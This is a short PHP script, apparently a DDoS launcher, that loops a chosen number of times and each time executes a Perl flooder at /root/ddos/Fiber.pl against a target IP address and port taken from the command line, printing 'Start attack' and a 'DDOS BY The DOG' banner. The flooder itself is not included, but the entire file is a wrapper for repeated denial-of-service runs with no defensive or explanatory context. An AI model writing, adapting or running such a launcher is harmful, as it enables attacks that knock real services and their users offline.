<?php
for ($x = 1; $x <= $argv[3]; $x++) {
	$rand = rand(1,30);
	print " Start attack ..";
	exec('/root/ddos/Fiber.pl '.$argv[1].' '.$argv[2].' 0 '.$rand.'');
	echo "Package DDOS BY The DOG IP ".$argv[1].":".$argv[2]." TIME $x \n";
}
?>